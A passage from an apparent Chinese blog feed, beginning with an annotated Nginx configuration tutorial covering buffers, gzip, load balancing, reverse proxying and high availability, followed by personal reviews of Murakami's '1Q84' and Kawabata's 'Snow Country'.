class="comment">#客户端请求头部的缓冲区大小。这个可以根据你的系统分页大小来设置，一般一个请求头的大小不会超过1k，不过由于一般系统分页都要大于1k，所以这里设置为分页大小。</span></span><br><span class="line">    <span class="comment">#分页大小可以用命令getconf PAGESIZE 取得。</span></span><br><span class="line">    <span class="comment">#[root@web001 ~]# getconf PAGESIZE</span></span><br><span class="line">    <span class="comment">#但也有client_header_buffer_size超过4k的情况，但是client_header_buffer_size该值必须设置为“系统分页大小”的整倍数。</span></span><br><span class="line">    <span class="attribute">client_header_buffer_size</span> <span class="number">4k</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#这个将为打开文件指定缓存，默认是没有启用的，max指定缓存数量，建议和打开文件数一致，inactive是指经过多长时间文件没被请求后删除缓存。</span></span><br><span class="line">    <span class="attribute">open_file_cache</span> max=<span class="number">65535</span> inactive=<span class="number">60s</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#这个是指多长时间检查一次缓存的有效信息。</span></span><br><span class="line">    <span class="comment">#语法:open_file_cache_valid time 默认值:open_file_cache_valid 60 使用字段:http, server, location 这个指令指定了何时需要检查open_file_cache中缓存项目的有效信息.</span></span><br><span class="line">    <span class="attribute">open_file_cache_valid</span> <span class="number">80s</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#open_file_cache指令中的inactive参数时间内文件的最少使用次数，如果超过这个数字，文件描述符一直是在缓存中打开的，如上例，如果有一个文件在inactive时间内一次没被使用，它将被移除。</span></span><br><span class="line">    <span class="comment">#语法:open_file_cache_min_uses number 默认值:open_file_cache_min_uses 1 使用字段:http, server, location  这个指令指定了在open_file_cache指令无效的参数中一定的时间范围内可以使用的最小文件数,如果使用更大的值,文件描述符在cache中总是打开状态.</span></span><br><span class="line">    <span class="attribute">open_file_cache_min_uses</span> <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#语法:open_file_cache_errors on | off 默认值:open_file_cache_errors off 使用字段:http, server, location 这个指令指定是否在搜索一个文件是记录cache错误.</span></span><br><span class="line">    <span class="attribute">open_file_cache_errors</span> <span class="literal">on</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#设定http服务器，利用它的反向代理功能提供负载均衡支持</span></span><br><span class="line">http&#123;</span><br><span class="line">    <span class="comment">#文件扩展名与文件类型映射表</span></span><br><span class="line">    <span class="attribute">include</span> mime.types;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#默认文件类型</span></span><br><span class="line">    <span class="attribute">default_type</span> application/octet-stream;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#默认编码</span></span><br><span class="line">    <span class="attribute">charset</span> utf-<span class="number">8</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#服务器名字的hash表大小</span></span><br><span class="line">    <span class="comment">#保存服务器名字的hash表是由指令server_names_hash_max_size 和server_names_hash_bucket_size所控制的。参数hash bucket size总是等于hash表的大小，并且是一路处理器缓存大小的倍数。在减少了在内存中的存取次数后，使在处理器中加速查找hash表键值成为可能。如果hash bucket size等于一路处理器缓存的大小，那么在查找键的时候，最坏的情况下在内存中查找的次数为2。第一次是确定存储单元的地址，第二次是在存储单元中查找键 值。因此，如果Nginx给出需要增大hash max size 或 hash bucket size的提示，那么首要的是增大前一个参数的大小.</span></span><br><span class="line">    <span class="attribute">server_names_hash_bucket_size</span> <span class="number">128</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#客户端请求头部的缓冲区大小。这个可以根据你的系统分页大小来设置，一般一个请求的头部大小不会超过1k，不过由于一般系统分页都要大于1k，所以这里设置为分页大小。分页大小可以用命令getconf PAGESIZE取得。</span></span><br><span class="line">    <span class="attribute">client_header_buffer_size</span> <span class="number">32k</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#客户请求头缓冲大小。nginx默认会用client_header_buffer_size这个buffer来读取header值，如果header过大，它会使用large_client_header_buffers来读取。</span></span><br><span class="line">    <span class="attribute">large_client_header_buffers</span> <span class="number">4</span> <span class="number">64k</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#设定通过nginx上传文件的大小</span></span><br><span class="line">    <span class="attribute">client_max_body_size</span> <span class="number">8m</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 on，如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。注意：如果图片显示不正常把这个改成off。</span></span><br><span class="line">    <span class="comment">#sendfile指令指定 nginx 是否调用sendfile 函数（zero copy 方式）来输出文件，对于普通应用，必须设为on。如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络IO处理速度，降低系统uptime。</span></span><br><span class="line">    <span class="attribute">sendfile</span> <span class="literal">on</span>;</span><br><span class="line">    </span><br><span class="line">     <span class="comment">#开启目录列表访问，合适下载服务器，默认关闭。</span></span><br><span class="line">    <span class="attribute">autoindex</span> <span class="literal">on</span>;</span><br><span class="line">    </span><br><span class="line">      <span class="comment">#此选项允许或禁止使用socke的TCP_CORK的选项，此选项仅在使用sendfile的时候使用</span></span><br><span class="line">    <span class="attribute">tcp_nopush</span> <span class="literal">on</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="attribute">tcp_nodelay</span> <span class="literal">on</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#长连接超时时间，单位是秒</span></span><br><span class="line">    <span class="attribute">keepalive_timeout</span> <span class="number">120</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#FastCGI相关参数是为了改善网站的性能：减少资源占用，提高访问速度。下面参数看字面意思都能理解。</span></span><br><span class="line">    <span class="attribute">fastcgi_connect_timeout</span> <span class="number">300</span>;</span><br><span class="line">    <span class="attribute">fastcgi_send_timeout</span> <span class="number">300</span>;</span><br><span class="line">    <span class="attribute">fastcgi_read_timeout</span> <span class="number">300</span>;</span><br><span class="line">    <span class="attribute">fastcgi_buffer_size</span> <span class="number">64k</span>;</span><br><span class="line">    <span class="attribute">fastcgi_buffers</span> <span class="number">4</span> <span class="number">64k</span>;</span><br><span class="line">    <span class="attribute">fastcgi_busy_buffers_size</span> <span class="number">128k</span>;</span><br><span class="line">    <span class="attribute">fastcgi_temp_file_write_size</span> <span class="number">128k</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#gzip模块设置</span></span><br><span class="line">    <span class="attribute">gzip</span> <span class="literal">on</span>; <span class="comment">#开启gzip压缩输出</span></span><br><span class="line">    <span class="attribute">gzip_min_length</span> <span class="number">1k</span>;    <span class="comment">#最小压缩文件大小</span></span><br><span class="line">    <span class="attribute">gzip_buffers</span> <span class="number">4</span> <span class="number">16k</span>;    <span class="comment">#压缩缓冲区</span></span><br><span class="line">    <span class="attribute">gzip_http_version</span> <span class="number">1</span>.<span class="number">0</span>; <span class="comment">#压缩版本（默认1.1，前端如果是squid2.5请使用1.0）</span></span><br><span class="line">    <span class="attribute">gzip_comp_level</span> <span class="number">2</span>;     <span class="comment">#压缩等级</span></span><br><span class="line">    <span class="attribute">gzip_types</span> text/plain application/x-javascript text/css application/xml;    <span class="comment">#压缩类型，默认就已经包含textml，所以下面就不用再写了，写上去也不会有问题，但是会有一个warn。</span></span><br><span class="line">    <span class="attribute">gzip_vary</span> <span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#开启限制IP连接数的时候需要使用</span></span><br><span class="line">    <span class="comment">#limit_zone crawler $binary_remote_addr 10m;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#负载均衡配置</span></span><br><span class="line">    <span class="attribute">upstream</span> piao.jd.com &#123;</span><br><span class="line">     </span><br><span class="line">        <span class="comment">#upstream的负载均衡，weight是权重，可以根据机器配置定义权重。weigth参数表示权值，权值越高被分配到的几率越大。</span></span><br><span class="line">        <span class="attribute">server</span> <span class="number">192.168.80.121:80</span> weight=<span class="number">3</span>;</span><br><span class="line">        <span class="attribute">server</span> <span class="number">192.168.80.122:80</span> weight=<span class="number">2</span>;</span><br><span class="line">        <span class="attribute">server</span> <span class="number">192.168.80.123:80</span> weight=<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#nginx的upstream目前支持4种方式的分配</span></span><br><span class="line">        <span class="comment">#1、轮询（默认）</span></span><br><span class="line">        <span class="comment">#每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。</span></span><br><span class="line">        <span class="comment">#2、weight</span></span><br><span class="line">        <span class="comment">#指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。</span></span><br><span class="line">        <span class="comment">#例如：</span></span><br><span class="line">        <span class="comment">#upstream bakend &#123;</span></span><br><span class="line">        <span class="comment">#    server 192.168.0.14 weight=10;</span></span><br><span class="line">        <span class="comment">#    server 192.168.0.15 weight=10;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line">        <span class="comment">#2、ip_hash</span></span><br><span class="line">        <span class="comment">#每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。</span></span><br><span class="line">        <span class="comment">#例如：</span></span><br><span class="line">        <span class="comment">#upstream bakend &#123;</span></span><br><span class="line">        <span class="comment">#    ip_hash;</span></span><br><span class="line">        <span class="comment">#    server 192.168.0.14:88;</span></span><br><span class="line">        <span class="comment">#    server 192.168.0.15:80;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line">        <span class="comment">#3、fair（第三方）</span></span><br><span class="line">        <span class="comment">#按后端服务器的响应时间来分配请求，响应时间短的优先分配。</span></span><br><span class="line">        <span class="comment">#upstream backend &#123;</span></span><br><span class="line">        <span class="comment">#    server server1;</span></span><br><span class="line">        <span class="comment">#    server server2;</span></span><br><span class="line">        <span class="comment">#    fair;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line">        <span class="comment">#4、url_hash（第三方）</span></span><br><span class="line">        <span class="comment">#按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存时比较有效。</span></span><br><span class="line">        <span class="comment">#例：在upstream中加入hash语句，server语句中不能写入weight等其他的参数，hash_method是使用的hash算法</span></span><br><span class="line">        <span class="comment">#upstream backend &#123;</span></span><br><span class="line">        <span class="comment">#    server squid1:3128;</span></span><br><span class="line">        <span class="comment">#    server squid2:3128;</span></span><br><span class="line">        <span class="comment">#    hash $request_uri;</span></span><br><span class="line">        <span class="comment">#    hash_method crc32;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#tips:</span></span><br><span class="line">        <span class="comment">#upstream bakend&#123;#定义负载均衡设备的Ip及设备状态&#125;&#123;</span></span><br><span class="line">        <span class="comment">#    ip_hash;</span></span><br><span class="line">        <span class="comment">#    server 127.0.0.1:9090 down;</span></span><br><span class="line">        <span class="comment">#    server 127.0.0.1:8080 weight=2;</span></span><br><span class="line">        <span class="comment">#    server 127.0.0.1:6060;</span></span><br><span class="line">        <span class="comment">#    server 127.0.0.1:7070 backup;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line">        <span class="comment">#在需要使用负载均衡的server中增加 proxy_pass http://bakend/;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#每个设备的状态设置为:</span></span><br><span class="line">        <span class="comment">#1.down表示单前的server暂时不参与负载</span></span><br><span class="line">        <span class="comment">#2.weight为weight越大，负载的权重就越大。</span></span><br><span class="line">        <span class="comment">#3.max_fails：允许请求失败的次数默认为1.当超过最大次数时，返回proxy_next_upstream模块定义的错误</span></span><br><span class="line">        <span class="comment">#4.fail_timeout:max_fails次失败后，暂停的时间。</span></span><br><span class="line">        <span class="comment">#5.backup： 其它所有的非backup机器down或者忙的时候，请求backup机器。所以这台机器压力会最轻。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#nginx支持同时设置多组的负载均衡，用来给不用的server来使用。</span></span><br><span class="line">        <span class="comment">#client_body_in_file_only设置为On 可以讲client post过来的数据记录到文件中用来做debug</span></span><br><span class="line">        <span class="comment">#client_body_temp_path设置记录文件的目录 可以设置最多3层目录</span></span><br><span class="line">        <span class="comment">#location对URL进行匹配.可以进行重定向或者进行新的代理 负载均衡</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#虚拟主机的配置</span></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="comment">#监听端口</span></span><br><span class="line">        <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#域名可以有多个，用空格隔开</span></span><br><span class="line">        <span class="attribute">server_name</span> www.jd.com jd.com;</span><br><span class="line">        <span class="comment">#默认入口文件名称</span></span><br><span class="line">        <span class="attribute">index</span> index.html index.htm index.php;</span><br><span class="line">        <span class="attribute">root</span> /data/www/jd;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#对******进行负载均衡</span></span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ .*.(php|php5)?$</span></span><br><span class="line"><span class="regexp"></span>        &#123;</span><br><span class="line">            <span class="attribute">fastcgi_pass</span> <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">            <span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">            <span class="attribute">include</span> fastcgi.conf;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">#图片缓存时间设置</span></span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ .*.(gif|jpg|jpeg|png|bmp|swf)$</span></span><br><span class="line"><span class="regexp"></span>        &#123;</span><br><span class="line">            <span class="attribute">expires</span> <span class="number">10d</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">#JS和CSS缓存时间设置</span></span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ .*.(js|css)?$</span></span><br><span class="line"><span class="regexp"></span>        &#123;</span><br><span class="line">            <span class="attribute">expires</span> <span class="number">1h</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">#日志格式设定</span></span><br><span class="line">        <span class="comment">#$remote_addr与$http_x_forwarded_for用以记录客户端的ip地址；</span></span><br><span class="line">        <span class="comment">#$remote_user：用来记录客户端用户名称；</span></span><br><span class="line">        <span class="comment">#$time_local： 用来记录访问时间与时区；</span></span><br><span class="line">        <span class="comment">#$request： 用来记录请求的url与http协议；</span></span><br><span class="line">        <span class="comment">#$status： 用来记录请求状态；成功是200，</span></span><br><span class="line">        <span class="comment">#$body_bytes_sent ：记录发送给客户端文件主体内容大小；</span></span><br><span class="line">        <span class="comment">#$http_referer：用来记录从那个页面链接访问过来的；</span></span><br><span class="line">        <span class="comment">#$http_user_agent：记录客户浏览器的相关信息；</span></span><br><span class="line">        <span class="comment">#通常web服务器放在反向代理的后面，这样就不能获取到客户的IP地址了，通过$remote_add拿到的IP地址是反向代理服务器的iP地址。反向代理服务器在转发请求的http头信息中，可以增加x_forwarded_for信息，用以记录原有客户端的IP地址和原来客户端的请求的服务器地址。</span></span><br><span class="line">        <span class="attribute">log_format</span> access <span class="string">&#x27;<span class="variable">$remote_addr</span> - <span class="variable">$remote_user</span> [<span class="variable">$time_local</span>] &quot;<span class="variable">$request</span>&quot; &#x27;</span></span><br><span class="line">        <span class="string">&#x27;<span class="variable">$status</span> <span class="variable">$body_bytes_sent</span> &quot;<span class="variable">$http_referer</span>&quot; &#x27;</span></span><br><span class="line">        <span class="string">&#x27;&quot;<span class="variable">$http_user_agent</span>&quot; <span class="variable">$http_x_forwarded_for</span>&#x27;</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">#定义本虚拟主机的访问日志</span></span><br><span class="line">        <span class="attribute">access_log</span>  /usr/local/nginx/logs/host.access.log  main;</span><br><span class="line">        <span class="attribute">access_log</span>  /usr/local/nginx/logs/host.access.<span class="number">404</span>.log  log404;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">#对 &quot;/connect-controller&quot; 启用反向代理</span></span><br><span class="line">        <span class="attribute">location</span> /connect-controller &#123;</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://127.0.0.1:88; <span class="comment">#请注意此处端口号不能与虚拟主机监听的端口号一样（也就是server监听的端口）</span></span><br><span class="line">            <span class="attribute">proxy_redirect</span> <span class="literal">off</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">             </span><br><span class="line">            <span class="comment">#后端的Web服务器可以通过X-Forwarded-For获取用户真实IP</span></span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">             </span><br><span class="line">            <span class="comment">#以下是一些反向代理的配置，可选。</span></span><br><span class="line">            <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#允许客户端请求的最大单文件字节数</span></span><br><span class="line">            <span class="attribute">client_max_body_size</span> <span class="number">10m</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#缓冲区代理缓冲用户端请求的最大字节数，</span></span><br><span class="line">            <span class="comment">#如果把它设置为比较大的数值，例如256k，那么，无论使用firefox还是IE浏览器，来提交任意小于256k的图片，都很正常。如果注释该指令，使用默认的client_body_buffer_size设置，也就是操作系统页面大小的两倍，8k或者16k，问题就出现了。</span></span><br><span class="line">            <span class="comment">#无论使用firefox4.0还是IE8.0，提交一个比较大，200k左右的图片，都返回500 Internal Server Error错误</span></span><br><span class="line">            <span class="attribute">client_body_buffer_size</span> <span class="number">128k</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#表示使nginx阻止HTTP应答代码为400或者更高的应答。</span></span><br><span class="line">            <span class="attribute">proxy_intercept_errors</span> <span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#后端服务器连接的超时时间_发起握手等候响应超时时间</span></span><br><span class="line">            <span class="comment">#nginx跟后端服务器连接超时时间(代理连接超时)</span></span><br><span class="line">            <span class="attribute">proxy_connect_timeout</span> <span class="number">90</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#后端服务器数据回传时间(代理发送超时)</span></span><br><span class="line">            <span class="comment">#后端服务器数据回传时间_就是在规定时间之内后端服务器必须传完所有的数据</span></span><br><span class="line">            <span class="attribute">proxy_send_timeout</span> <span class="number">90</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#连接成功后，后端服务器响应时间(代理接收超时)</span></span><br><span class="line">            <span class="comment">#连接成功后_等候后端服务器响应时间_其实已经进入后端的排队之中等候处理（也可以说是后端服务器处理请求的时间）</span></span><br><span class="line">            <span class="attribute">proxy_read_timeout</span> <span class="number">90</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#设置代理服务器（nginx）保存用户头信息的缓冲区大小</span></span><br><span class="line">            <span class="comment">#设置从被代理服务器读取的第一部分应答的缓冲区大小，通常情况下这部分应答中包含一个小的应答头，默认情况下这个值的大小为指令proxy_buffers中指定的一个缓冲区的大小，不过可以将其设置为更小</span></span><br><span class="line">            <span class="attribute">proxy_buffer_size</span> <span class="number">4k</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#proxy_buffers缓冲区，网页平均在32k以下的设置</span></span><br><span class="line">            <span class="comment">#设置用于读取应答（来自被代理服务器）的缓冲区数目和大小，默认情况也为分页大小，根据操作系统的不同可能是4k或者8k</span></span><br><span class="line">            <span class="attribute">proxy_buffers</span> <span class="number">4</span> <span class="number">32k</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#高负荷下缓冲大小（proxy_buffers*2）</span></span><br><span class="line">            <span class="attribute">proxy_busy_buffers_size</span> <span class="number">64k</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#设置在写入proxy_temp_path时数据的大小，预防一个工作进程在传递文件时阻塞太长</span></span><br><span class="line">            <span class="comment">#设定缓存文件夹大小，大于这个值，将从upstream服务器传</span></span><br><span class="line">            <span class="attribute">proxy_temp_file_write_size</span> <span class="number">64k</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#本地动静分离反向代理配置</span></span><br><span class="line">        <span class="comment">#所有jsp的页面均交由tomcat或resin处理</span></span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ .(jsp|jspx|do)?$</span> &#123;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://127.0.0.1:8080;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="nginx配置实例-反向代理"><a class="markdownIt-Anchor" href="#nginx配置实例-反向代理"></a> Nginx配置实例-反向代理</h2>
<p>在Nginx配置文件中将location中的位置改为所要展示的页面的绝对地址，或者使用proxy_pass改为所要跳转的端口。</p>
<h2 id="nginx配置实例-负载均衡"><a class="markdownIt-Anchor" href="#nginx配置实例-负载均衡"></a> Nginx配置实例-负载均衡</h2>
<p>**实现效果：**浏览器地址栏输入地址，负载均衡效果，平均到8080和8081端口中。</p>
<p><strong>在nginx配置文件中进行负载均衡的配置：</strong></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http&#123;</span><br><span class="line">......</span><br><span class="line">	<span class="attribute">upstream</span> myserver&#123;</span><br><span class="line">		ip_hash;</span><br><span class="line">		<span class="attribute">server</span> <span class="number">115.28.52.63:8080</span> weight=<span class="number">1</span>;</span><br><span class="line">		<span class="attribute">server</span> <span class="number">115.28.52.63:8081</span> weight=<span class="number">1</span>;</span><br><span class="line">        fair;</span><br><span class="line">	&#125;</span><br><span class="line">	server&#123;</span><br><span class="line">		location/&#123;</span><br><span class="line">			......</span><br><span class="line">			<span class="attribute">proxy_pass</span> http://myserver;</span><br><span class="line">			<span class="attribute">proxy_connect_timeout</span> <span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Nginx提供了几种分配方式（策略）：</p>
<p><strong>1.轮询（默认）：</strong></p>
<p>每个请求按时间顺序逐一分配到不同的的后端服务器，如果后端服务器宕机，能自动剔除。</p>
<p><strong>2.weight：</strong></p>
<p>weight代表权重，默认为1，权重越高被分配的客户端越多。</p>
<p><strong>3.ip_hash:</strong></p>
<p>每个请求按访问ip的hash的结果分配，这样每一个访客固定访问一个后端服务器，可以解决session问题。</p>
<p><strong>4.fair（第三方）：</strong></p>
<p>按后端服务器的响应时间来分配请求，响应时间短的优先分配。</p>
<h2 id="nginx配置实例-动静分离"><a class="markdownIt-Anchor" href="#nginx配置实例-动静分离"></a> Nginx配置实例-动静分离</h2>
<p>Nginx动静分离简单来说就是把动态跟静态请求分开，不能理解成只是单纯的把动态页面和静态页面物理分离，严格意义上说应该是动态请求和静态请求分开。动静分离从目前实现角度来讲大致分为两种：</p>
<p>一种是纯粹把静态文件独立成单独的域名，放在独立的服务器上，也是目前主流推崇的方案。</p>
<p>另外一种方法就是把动态和静态页面混合在一起发布，通过nginx来分开。</p>
<p><strong>在配置文件中进行分离配置：</strong></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> /www/ &#123;</span><br><span class="line">	<span class="attribute">root</span> /data/;</span><br><span class="line">	<span class="attribute">index</span> index.html index.htm;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">location</span> /image/ &#123;</span><br><span class="line">	<span class="attribute">root</span> /data/;</span><br><span class="line">	<span class="attribute">autoindex</span> <span class="literal">on</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="nginx配置实例-高可用"><a class="markdownIt-Anchor" href="#nginx配置实例-高可用"></a> Nginx配置实例-高可用</h2>
<p>**高可用：**需要多台nginx服务器（防止nginx宕机），需安装keepalived</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install keepalived -y</span><br></pre></td></tr></table></figure>
<p>在/etc里面生成目录keepalived，有配置文件keepalived.conf</p>
<p>在/usr/local/src添加检测脚本文件。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>服务器</tag>
        <tag>后端开发</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>1Q84</title>
    <url>/2020/06/21/1Q84/</url>
    <content><![CDATA[<p>这几天看完了三册共近百万字的《1Q84》，说实话并没有怎么看懂,因为作者在其中有很多谜团都没有解释清楚。比如大川奈天吾十岁的女朋友为什么突然“丧失了”，中野亚由美的死因到底是意外死亡还是有人蓄意地谋杀，小小人和空气蛹到底是怎么样的存在，它们对这个世界想要做些什么。这些作者都没有给我们一个清楚的答案。</p>
<a id="more"></a>
<p>从书名可以看出本书是致敬乔治奥威尔的《1984》，但同《1984》的不同之处在于《1984》致力于构造一个外化的、政治色彩的反乌托邦世界，在那里“老大哥”扮演着政治首脑，他（们）致力于监视民众的行为，对民众的思想进行“净化”。而在本书里则更关心人的内心世界，它从表面上看和真实世界无异，只不过，它把很多原本内化于人心之中的东西变的更为具象了，比如小小人，空气蛹，天吾父亲的“意识”变成了NHK职员。</p>
<p>青豆本身以为自己是误入了1Q84世界，但后来在刺杀“先驱”领袖的时候被告知自己进入这个世界是必然的事情，后面又反复提到“这就像一个无限的悖论，自己的意识包含着世界，而这个世界又包含着自己的意识”。毫无疑问地是，在这个故事中好像每一个人都不是那么的快乐，青豆和天吾拥有着不幸的童年，青豆的父母都是证人会的教徒，他们对青豆进行严苛的不近人情的要求，迫使她失去了童年；而天吾的父亲每周末都要带他去收NHK电视费，丧失了他自由活动的时间；牛河因为丑陋的外貌而不被人喜欢并且遭到了妻子的背叛。</p>
<p>在来到这个世界之前，青豆和天吾从来未想到去互相寻找对方，追寻自己的爱情，青豆一直想的是“能够在某一条街道偶遇川奈天吾”，这固然是一件浪漫的事情，但细想起来好像也不那么现实，在进到这个世界前，他们都以为自己只是一厢情愿，或许对方连自己的样子都记不清了，他们只是将自己关在一个房间里，那里没有门，也没有窗户，别人进不来，他们也出不去，尽管被称为“神童”并且拥有着美好的光明前途的时候，他们好像对一切都漠不关心，放弃了拼搏的动力，仅仅甘心于做一名补习课老师和体育教练，这样独自一个人，孤身，却并没有感到怎么孤独，好像也不错，但却丧失了生命的意义。</p>
<p>村上春树善于使用隐喻的手法，在这里“小小人”和“空气蛹”看起来可爱、无害，却是邪恶的代表。在我看来，这更像是心灵里邪恶的那面，它们无法攻击你本身，却可以攻击你身边的人，使人的亲人、朋友一个接一个的“丧失”，在“1Q84”世界里的丧失，在现实世界中不如说因为一个人封闭的灵魂而逐渐同社会脱节，同亲人朋友的关系逐渐冷漠。<br>
村上春树是因为东京地下铁毒气事件开始写这篇小说的，因为他被这件事情所震惊，因为他不明白为什么会有人去做这种事情，于是他花了九年的时间去做调查。在调查中发现，这些人从个人层面上看，都并没有特别邪恶或者特别愚蠢。他们只是对这个世界不满，并且沉浸在自己的乌托邦之中。</p>
<p>在这本小说中，你其实可以想象它是一个梦，在梦中进行意识的攻城略地。但无可置疑的是，如果你仅仅沉浸在自己的世界中，不去面对现实，只把自己封锁在小房子里，“小小人”就会来临，通过制造“空气蛹”来制造子体，你的意识就会慢慢地丧失。<br>
这本小说，个人感觉除了致敬《1984》之外，也有《变形记》和《追忆似水年华》的影子.</p>
<p><img src="/2020/06/21/1Q84/book.JPG" alt></p>
]]></content>
      <categories>
        <category>读书</category>
      </categories>
      <tags>
        <tag>文学</tag>
        <tag>爱情</tag>
        <tag>人生</tag>
      </tags>
  </entry>
  <entry>
    <title>雪国与情书</title>
    <url>/2020/06/08/Reading1/</url>
    <content><![CDATA[<p><img src="/2020/06/08/Reading1/jpg1.jpg" alt></p>
<p>在日本的浪漫文学中，“雪”的色彩占据了极大的比重。往往在故事的开头，都是在一片茫茫的白雪中，或是无人，或是人烟稀少，从未有过在一个繁华的都市中或是人眼麇集的闹市中的。在《雪国》的开头即是一个人人都可背诵的名段：</p>
<blockquote>
<p>穿过县界长长的隧道，便是雪国。夜空下一片白茫茫。火车在信号所前停了下来。</p>
</blockquote>
<a id="more"></a>
<p>在故事的开头，主人公岛村即在火车上遇上了一个美丽、纯粹得几乎不沾染任何人世间烟火的少女的叶子：</p>
<blockquote>
<p>这当儿，姑娘的脸上闪现着灯光。镜中映像的清晰度并没有减弱窗外的灯光。灯光也没有把映像抹去。灯火就这样从她的脸上闪过，但并没有把她的脸照亮。这是一束从远方投来的寒光，模模糊糊地照亮了她眼睛的周围。她的眼睛同灯光重叠的那一瞬间，就像在夕阳的余晖里飞舞的夜火虫，妖艳而美丽。</p>
</blockquote>
<p>故事讲述的是男主人公岛村三次来雪国与两个少女驹子与叶子所发生的故事，故事的开头正发生在岛村第二次来雪国的时候。随后，岛村望着自己的手指，思绪飘飞，于是时间线即一种偏意识流的方式流转在岛村三次来到雪国同少女驹子相识到熟识的过程。最终以叶子的死亡而结束。</p>
